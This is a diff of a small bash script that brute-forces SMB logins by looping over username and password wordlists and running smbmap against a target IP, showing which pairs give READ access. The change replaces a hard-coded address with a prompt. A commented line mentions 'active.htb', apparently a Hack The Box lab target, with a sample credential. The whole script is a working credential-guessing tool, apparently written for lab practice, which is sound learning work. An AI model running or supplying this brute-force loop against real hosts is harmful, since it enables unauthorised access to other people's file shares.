@@ -1,12 +1,16 @@
 #!/bin/bash
-for user in $(cat usernames)
+read -p "Enter IP address: " ip
+
+for user in $(cat usernames.txt)
 do
 
-	for pass in $(cat passwords)
+	for pass in $(cat passwords.txt)
 	do
 		echo "Testing $user:$pass"
-		#smbmap -d active.htb -u svc_tgs -p thepassword -H 10.10.10.100
-		smbmap -u $user -p $pass -H 192.168.130.134 | grep -i "READ"
+		#smbmap -d active.htb -u svc_tgs -p thepassword -H $ip
+		smbmap -u $user -p $pass -H $ip | grep -i "READ"
 	done
 
 done
+
+echo "If host is windows try with domain option"
